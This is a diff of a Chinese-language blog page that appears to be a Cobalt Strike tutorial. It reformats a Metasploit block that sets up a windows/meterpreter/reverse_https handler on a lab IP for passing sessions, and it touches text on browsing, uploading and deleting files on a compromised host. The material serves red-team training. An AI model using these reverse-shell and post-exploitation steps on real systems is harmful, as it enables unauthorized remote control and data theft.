@@ -484,8 +484,11 @@
 <h2 id="会话传递使用场景"><a href="#会话传递使用场景" class="headerlink" title="会话传递使用场景"></a>会话传递使用场景</h2><p>1、将当前会话传递至其他CS团队服务器中，直接右击<code>spawn</code>选择要传递的监听器即可。</p>
 <p>2、将当前会话传递至MSF中，这里简单做一下演示。</p>
 <p>首先，在MSF中，为攻击载荷新建一个payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_https</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set lhost 192.168.175.156</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set lport 443</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; exploit -j</span><br></pre></td></tr></table></figure>
-
+<pre><code>msf5 &gt; use exploit/multi/handler
+msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_https
+msf5 exploit(multi/handler) &gt; set lhost 192.168.175.156
+msf5 exploit(multi/handler) &gt; set lport 443
+msf5 exploit(multi/handler) &gt; exploit -j</code></pre>
 <p>随后，在CS中新建一个外部<code>Foreign</code>监听器，这里设置的监听IP与端口和MSF中的一致即可，随后在CS中利用<code>spawn</code>选择刚新建的外部监听器，MSF中即可返回会话。</p>
 <h1 id="0x03-文件系统"><a href="#0x03-文件系统" class="headerlink" title="0x03 文件系统"></a>0x03 文件系统</h1><p>浏览会话系统文件位置在右击会话处，选择 <code>Explore --&gt; File Browser</code>即可打开。在这里可以对当前会话下的文件进行浏览、上传、下载、删除等操作。</p>
 <p>在进行文件浏览时，如果 beacon 设置的 sleep 值较高，CS会因此而变得响应比较慢。</p>
@@ -933,7 +936,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">115.1k</span>&nbsp;字
+                class="white-color">114.7k</span>&nbsp;字
             
             
             
